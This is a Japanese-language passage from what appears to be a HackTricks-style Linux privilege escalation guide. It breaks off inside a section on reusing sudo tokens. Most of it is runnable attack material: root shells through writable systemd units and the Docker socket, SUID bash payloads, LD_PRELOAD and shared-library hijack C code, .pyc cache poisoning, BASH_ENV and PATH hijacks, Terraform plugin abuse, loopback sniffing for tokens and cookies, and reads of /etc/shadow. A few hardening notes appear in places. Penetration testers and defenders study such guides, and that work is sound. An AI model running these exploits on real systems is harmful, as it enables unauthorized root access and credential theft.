**writable** な `.socket` file を見つけた場合、`[Socket]` section の先頭に `ExecStartPre=/home/kali/sys/backdoor` のようなものを **add** できます。すると、socket が作成される前に backdoor が実行されます。そのため、**machine が reboot されるまで待つ必要がある可能性があります。**\
_ただし、system がその socket file configuration を使用していなければ、backdoor は実行されない点に注意してください_

### Socket activation + writable unit path (create missing service)

もう 1 つの high-impact な misconfiguration は次のとおりです。

- `Accept=no` および `Service=<name>.service` を持つ socket unit
- 参照されている service unit が存在しない
- attacker が `/etc/systemd/system`（または別の unit search path）に write できる

この場合、attacker は `<name>.service` を作成し、その後 socket に traffic を trigger することで、systemd に新しい service を root として load および execute させることができます。

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能な socket

**書き込み可能な socket**（ここで話しているのは Unix Sockets であり、設定用の `.socket` ファイルではありません）を**特定した場合、その socket と通信でき**、脆弱性を exploit できる可能性があります。

### Unix Sockets を列挙する
```bash
netstat -a -p --unix
```
### Raw接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

**HTTP** リクエストを待ち受けている **socket** が存在する場合があります（_ここで言っているのは .socket ファイルではなく、Unix socket として機能するファイルです_）。次のコマンドで確認できます：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
ソケットが **HTTP** リクエストに**応答**する場合、そのソケットと**通信**でき、場合によっては**脆弱性を exploit** できます。

### Writable Docker Socket

Docker socket は、多くの場合 `/var/run/docker.sock` にあり、適切に保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。この socket への書き込みアクセス権を持っていると、privilege escalation につながる可能性があります。ここでは、その方法と、Docker CLI が利用できない場合の代替手段について説明します。

#### **Privilege Escalation with Docker CLI**

Docker socket への書き込みアクセス権がある場合、以下のコマンドを使用して privilege escalation を実行できます。
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使用すると、host のファイルシステムに root-level access できる container を実行できます。

#### **Docker API を直接使用する**

Docker CLI を利用できない場合でも、Docker API と `curl` コマンドを使用して Docker socket を操作できます。

1.  **Docker Images を一覧表示:** 利用可能な image の一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Container を作成:** host system の root directory を mount する container を作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成した container を起動します。

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Container に attach:** `socat` を使用して container への接続を確立し、その中で command を実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection の設定後、host の filesystem に root-level access できる状態で、container 内で command を直接実行できます。

### その他

`docker` group の **inside にいる** ため Docker socket への write permissions がある場合は、[**privileges を escalate する方法がさらにあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**Docker API が port で listen している**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising) 場合は、それを compromise することもできます。

**Container から break out する、または container runtimes を abuse して privileges を escalate する方法**については、以下を確認してください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`ctr` command を使用できる場合は、以下の page を読んでください。**abuse して privileges を escalate できる可能性があります**。


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`runc` command を使用できる場合は、以下の page を読んでください。**abuse して privileges を escalate できる可能性があります**。


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、application が効率的に相互作用し、data を共有できる高度な **inter-Process Communication (IPC) system** です。modern Linux system を念頭に設計されており、さまざまな形式の application communication に対応する堅牢な framework を提供します。

この system は versatile で、process 間の data exchange を強化する basic IPC をサポートしており、これは **enhanced UNIX domain sockets** に似ています。さらに、event や signal の broadcast にも対応し、system components 間の seamless な integration を実現します。例えば、Bluetooth daemon から着信を知らせる signal によって music player が mute され、user experience が向上します。また、D-Bus は remote object system にも対応しており、application 間の service request や method invocation を簡略化します。これにより、従来は複雑だった process を効率化できます。

D-Bus は **allow/deny model** で動作し、matching policy rules の累積効果に基づいて message permissions（method calls、signal emissions など）を管理します。これらの policies は bus との interaction を指定し、permissions の exploitation による privilege escalation を可能にする場合があります。

このような policy の例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` には、root user が `fi.w1.wpa_supplicant1` の message を own、send、receive するための permissions が記述されています。

user または group が指定されていない policies は universal に適用されます。一方、"default" context policies は、他の specific policies の対象になっていないすべての対象に適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication の enumerate と exploit 方法はこちら：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを常に enumerate して、マシンの位置を把握することは有用です。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

ホスト上でコマンドを実行できるもののコールバックに失敗する場合は、DNS、トランスポート、プロキシ、ルートの各フィルタリングを迅速に切り分けます。
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 開いているポート

アクセスする前に、これまで対話できなかったマシン上で稼働しているネットワークサービスを必ず確認します：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
bind target で listeners を分類します:

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカル専用です（tunnel/forward の候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみ到達可能です。

### ローカル専用サービスの triage workflow

ホストを compromise すると、`127.0.0.1` に bind されたサービスに、初めて shell からアクセスできるようになることがあります。簡単なローカル workflow は次のとおりです:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### ネットワークスキャナーとしての LinPEAS（network-only mode）

ローカルの PE チェックに加えて、linPEAS は対象を絞ったネットワークスキャナーとして実行できます。利用可能な `$PATH` 内のバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールすることはありません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` なしで `-d`、`-p`、または `-i` を指定すると、linPEAS は pure network scanner として動作します（それ以外の privilege-escalation checks はスキップされます）。

### Sniffing

traffic を sniff できるか確認します。可能であれば、credentials を取得できる可能性があります。
```
timeout 1 tcpdump
```
手早く実践的なチェック:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback（`lo`）は、内部専用サービスがそこで tokens/cookies/credentials を公開していることが多いため、post-exploitation において特に価値があります：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今キャプチャし、後で解析する:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## ユーザー

### Generic Enumeration

自分が**誰**であるか、どのような**privileges**を持っているか、システム上にどの**ユーザー**が存在するか、どのユーザーが**login**でき、どのユーザーが**root privileges**を持っているかを確認します。
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root privileges を与える可能性のある**グループのメンバー**になっていないか確認します:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、clipboard 内に興味深い情報がないか確認します。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

環境内の**パスワードを1つでも知っている**場合は、そのパスワードを使用して**各ユーザーとしてログイン**してみてください。

### Su Brute

大量のノイズが発生しても問題なく、`su` と `timeout` のバイナリがコンピューター上に存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使用してユーザーの brute-force を試すことができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` パラメーターを指定するとユーザーの brute-force を試行します。

## Writable PATH abuses

### $PATH

**$PATH 内のいずれかのフォルダーに書き込み可能**であることが分かった場合、**書き込み可能なフォルダー内に backdoor を作成**することで privilege escalation が可能になる場合があります。その際は、別のユーザー（理想的には root）によって実行されるコマンドの名前を付け、そのコマンドが $PATH 内で書き込み可能なフォルダーより**前に位置するフォルダーから読み込まれない**ことが条件です。

### SUDO and SUID

sudo を使用して一部のコマンドを実行できる場合や、SUID bit が設定されている場合があります。次のコマンドで確認してください。
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の **予期しないコマンドによって、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能になります。** 例:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーがパスワードを知らなくても、別のユーザーの権限で一部のコマンドを実行できる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `vim` を `root` として実行できます。そのため、root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで、簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブを使用すると、ユーザーは何かを実行する際に**環境変数を設定**できます:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirerをベースにしており**、rootとしてscriptを実行する際に任意のpython libraryを読み込む **PYTHONPATH hijacking** に**脆弱でした**：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports における writable `__pycache__` / `.pyc` poisoning

**sudo-allowed Python script** が、package directory 内に **writable `__pycache__`** を含む module を imports している場合、cached `.pyc` を置き換え、次回の import 時に privileged user として code execution を得られる可能性があります。

- なぜ機能するのか:
- CPython は bytecode cache を `__pycache__/module.cpython-<ver>.pyc` に保存します。
- interpreter は **header**（magic + source に紐付いた timestamp/hash metadata）を検証し、その後に格納された marshaled code object を実行します。
- directory が writable で cached file を **delete and recreate** できる場合、root-owned だが non-writable な `.pyc` でも置き換えられます。
- Typical path:
- `sudo -l` に、root として実行可能な Python script または wrapper が表示される。
- その script が `/opt/app/`、`/usr/local/lib/...` などから local module を imports する。
- imported module の `__pycache__` directory が user または全員に対して writable になっている。

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
特権スクリプトを検査できる場合は、インポートされているモジュールとそのキャッシュパスを特定します：
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
悪用手順:

1. sudo-allowed script を一度実行し、まだ存在しない場合は Python に正規の cache file を作成させる。
2. 正規の `.pyc` から先頭 16 バイトを読み取り、poisoned file で再利用する。
3. payload code object をコンパイルして `marshal.dumps(...)` し、元の cache file を削除して、元の header と悪意のある bytecode を結合した内容で再作成する。
4. sudo-allowed script を再実行し、import 時に payload を root として実行させる。

重要な注意事項:

- 元の header を再利用することが重要です。Python は bytecode 本体が source と実際に一致するかどうかではなく、cache metadata と source file の対応を確認するためです。
- これは、source file が root-owned で書き込み不可でも、格納先の `__pycache__` directory が書き込み可能な場合に特に有効です。
- 特権プロセスが `PYTHONDONTWRITEBYTECODE=1` を使用している場合、safe permissions が設定された場所から import している場合、または import path 内のすべての directory への書き込み権限が削除されている場合、attack は失敗します。

最小限の proof-of-concept の形:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- 特権 Python import path 内のディレクトリが、`__pycache__` を含め、低権限ユーザーによって書き込み可能になっていないことを確認する。
- 特権実行では、`PYTHONDONTWRITEBYTECODE=1` の設定と、予期しない書き込み可能な `__pycache__` ディレクトリを定期的に確認することを検討する。
- 書き込み可能なローカル Python modules と書き込み可能な cache directories は、root によって実行される書き込み可能な shell scripts や shared libraries と同じように扱う。

### sudo env_keep によって保持された BASH_ENV → root shell

sudoers が `BASH_ENV` を保持する場合（例：`Defaults env_keep+="ENV BASH_ENV"`）、許可された command の実行時に、Bash の non-interactive startup behavior を利用して arbitrary code を root として実行できる。

- 動作する理由：non-interactive shells では、Bash は target script を実行する前に `$BASH_ENV` を評価し、その file を source する。多くの sudo rules では、script または shell wrapper の実行が許可されている。`BASH_ENV` が sudo によって保持される場合、指定した file は root privileges で source される。

- Requirements:
- 実行可能な sudo rule（non-interactively `/bin/bash` を呼び出す任意の target、または任意の bash script）。
- `env_keep` に `BASH_ENV` が存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
- sudo で許可するコマンドに shell wrapper を使用せず、最小限のバイナリを使用する。
- 保持された環境変数が使用された際に、sudo の I/O logging と alerting を検討する。

### sudo 経由の Terraform と保持された HOME（!env_reset）

sudo が環境をそのまま保持する場合（`!env_reset`）、`$HOME` は呼び出し元の user のままになる。そのため Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` に従う。

- 必要な provider を writable な directory に指定し、その provider の名前（例：`terraform-provider-examples`）の malicious な plugin を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root として実行するため、SUID shell が残ります。

### TF_VAR overrides + symlink validation bypass

Terraform の variables は `TF_VAR_<name>` environment variables を通じて指定できます。これらは sudo が environment を保持すると、そのまま残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い validation は、symlink によって bypass できます：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraformはシンボリックリンクを解決し、実際の`/root/root.txt`を攻撃者が読み取り可能な宛先にコピーします。同じ手法を使用して、特権パスへの**書き込み**も実行できます。これは、宛先のシンボリックリンクを事前に作成し、プロバイダーの宛先パスを`/etc/cron.d/`内などに向けることで可能です。

### requiretty / !requiretty

古いディストリビューションの一部では、sudoに`requiretty`を設定できます。これにより、sudoはインタラクティブなTTYからのみ実行されます。`!requiretty`が設定されている場合（またはこのオプションが存在しない場合）、sudoはreverse shell、cron job、scriptなどの非インタラクティブなコンテキストから実行できます。
```bash
Defaults !requiretty
```
これは、それ自体が直接的な脆弱性ではありませんが、完全な PTY を必要とせずに sudo ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示される場合、または攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が設定されている場合、sudo で許可された対象内にある相対パスのコマンドを同名の別コマンドで shadow できます。

- Requirements: 絶対パスを使用せずにコマンド（`free`、`df`、`ps` など）を呼び出す script/binary を実行する sudo ルール（多くの場合 `NOPASSWD`）と、検索順が先になる書き込み可能な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo実行時のパス制限の回避
**Jump** して他のファイルを読み取ったり、**symlinks** を使用したりします。たとえば、sudoers file では次のようになります: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**wildcard**（\*）を使用すると、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスなしの Sudo command/SUID binary

**sudo permission** が単一のコマンドに対して**パスを指定せず**に与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで exploit できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この technique は、**suid** binary が path を指定せずに別の command を **executes** する場合にも使用できます（常に _**strings**_ を使用して、奇妙な SUID binary の content を確認してください）。

[Payload examples to execute.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Command path を指定する SUID binary

**suid** binary が path を指定して別の command を **executes** する場合は、その SUID file が calling している command と同じ名前の **function を export** してみることができます。

例えば、SUID binary が _**/usr/sbin/service apache2 start**_ を calling している場合は、function を作成して export してみる必要があります。
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then、SUID binary を呼び出すと、この関数が実行されます

### SUID wrapper によって実行される Writable script

一般的な custom-app の設定ミスとして、root 所有の SUID binary wrapper が script を実行する一方で、その script 自体が low-priv ユーザーによって writable になっているケースがあります。

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` が書き込み可能な場合、payload コマンドを追加してから SUID wrapper を実行できます:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
簡単な確認:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
この攻撃経路は、`/usr/local/bin` に配置された "maintenance"/"backup" wrappers で特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより先に loader によって読み込まれる共有ライブラリ（.so ファイル）を 1 つ以上指定するために使用されます。この処理は、ライブラリの preloading と呼ばれます。

ただし、system security を維持し、この機能が悪用されること、特に **suid/sgid** executable に対する悪用を防ぐため、system は特定の条件を適用します。

- loader は、real user ID（_ruid_）が effective user ID（_euid_）と一致しない executable では **LD_PRELOAD** を無視します。
- suid/sgid が設定された executable では、standard paths にあり、かつ suid/sgid でもある library のみが preload されます。

`sudo` で commands を実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という statement が含まれている場合、privilege escalation が発生する可能性があります。この configuration により、`sudo` で commands を実行した場合でも **LD_PRELOAD** 環境変数が保持されて認識されるため、elevated privileges で arbitrary code が実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存します
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
その後、**次を使用してコンパイルします**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合、同様の privesc が悪用される可能性があります。これは、ライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** permissionsを持つ、一見通常とは異なるbinaryに遭遇した場合、**.so** filesを適切にloadしているか確認するのがよいでしょう。これは、次のcommandを実行して確認できます。
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
たとえば、_「open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)」_ のようなエラーに遭遇した場合、exploit の可能性があることを示しています。

これを exploit するには、まず _"/path/to/.config/libcalc.c"_ などの C ファイルを作成し、そこに次のコードを記述します。
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限でシェルを実行することで、権限昇格を行うことを目的とします。

上記の C ファイルを、以下のコマンドで共有オブジェクト（.so）ファイルにコンパイルします：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受ける SUID binary を実行すると exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリを読み込む SUID binary が見つかったので、そのフォルダに必要な名前でライブラリを作成しましょう。
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合は
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成した library には `a_function_name` という名前の function が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、attacker が local security restrictions を bypass するために exploit できる Unix binaries の curated list です。[**GTFOArgs**](https://gtfoargs.github.io/) は、command に **arguments のみ inject できる**場合を対象にした同様の list です。

この project は、restricted shells から脱出したり、elevated privileges を escalate または維持したり、files を transfer したり、bind shells や reverse shells を spawn したり、その他の post-exploitation tasks を実行したりするために abuse できる、Unix binaries の正規の functions を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` に access できる場合、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool を使用して、sudo rule の exploit 方法が見つかるか確認できます。

### Reusing Sudo Tokens

**sudo access がある**ものの password がない場合、**sudo command の実行を待ち、その後 session token を hijack する**ことで privileges を escalate できます。

Privileges を escalate するための requirements:

- すでに user "_sampleuser_" として shell を取得している
- "_sampleuser_" が **過去 15 分以内に `sudo` を使用している**（デフォルトでは、これは sudo token の有効期間です。この token により password を入力せずに `sudo` を使用できます）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0
- `gdb` に access できる（upload できる状態でも可）

